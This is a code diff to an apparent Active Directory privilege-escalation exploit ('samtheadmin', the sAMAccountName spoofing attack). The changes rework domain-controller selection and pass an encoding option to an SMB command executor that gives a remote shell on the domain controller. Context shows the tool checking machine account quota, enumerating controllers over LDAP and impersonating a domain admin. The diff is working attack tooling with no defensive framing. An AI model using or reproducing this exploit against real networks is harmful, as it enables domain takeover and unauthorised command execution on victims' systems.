@@ -45,7 +45,7 @@ def exploit(dcfull,adminticket,options):
     if options.shell:
         try:
             executer = CMDEXEC('', '', domain, None, None, True, options.dc_ip,
-                            options.mode, options.share, int(options.port), options.service_name, options.shell_type)
+                            options.mode, options.share, int(options.port), options.service_name, options.shell_type, options.codec)
             executer.run(dcfull, options.dc_ip)
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
@@ -93,34 +93,35 @@ def samtheadmin(username, password, domain, options):
     else:
         logging.info(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')
 
-    if options.host_name:
-        dc_host = options.host_name.upper()
+    if options.dc_host:
+        dc_host = options.dc_host.upper()
         dcfull = f'{dc_host}.{domain}'
         dn = get_user_info(dc_host+"$", ldap_session, domain_dumper)
         if not dn:
             logging.error(f'Machine not found in LDAP: {dc_host}')
             return
     else:
-        dcinfo = get_dc_host(ldap_session, domain_dumper)
-        if not len(dcinfo['name']):
+        dcinfo = get_dc_host(ldap_session, domain_dumper,options)
+        if len(dcinfo)== 0:
             logging.error("Cannot get domain info")
             exit()
         c_key = 0
-        if len(dcinfo['name']) > 1:
+        dcs = list(dcinfo.keys())
+        if len(dcs) > 1:
             logging.info('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
             cnt = 0
-            for name in dcinfo['name']:
+            for name in dcs:
                 logging.info(f"{cnt}: {name}")
                 cnt += 1
             while True:
                 try:
                     c_key = int(input(">>> Your choice: "))
-                    if c_key in range(len(dcinfo['name'])):
+                    if c_key in range(len(dcs)):
                         break
                 except Exception:
                     pass
-        dc_host = dcinfo['name'][c_key].lower()
-        dcfull = dcinfo['dNSHostName'][c_key].lower()
+        dc_host = dcs[c_key].lower()
+        dcfull = dcinfo[dcs[c_key]]['dNSHostName'].lower()
     logging.info(f'Selected Target {dcfull}')
     if options.impersonate:
         domain_admin = options.impersonate
@@ -208,7 +209,6 @@ if __name__ == '__main__':
                                                               'delegation to the SPN specified')
 
     parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
-    parser.add_argument('-host-name', action='store', metavar='HOSTNAME', help='Target Host name. Required if the domain has multiple domain controllers.')
     parser.add_argument('-new-name', action='store', metavar='NEWNAME', help='Add new computer name, if not specified, will be random generated.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
@@ -233,7 +233,7 @@ if __name__ == '__main__':
     parser.add_argument('-use-ldaps', action='store_false', help='Use LDAPS instead of LDAP')
 
 
-    exec =  parser.add_argument_group('execute')
+    exec =  parser.add_argument_group('execute options')
     exec.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                        help='Destination port to connect to SMB Server')
     parser.add_argument('-mode', action='store', choices = {'SERVER','SHARE'}, default='SHARE',
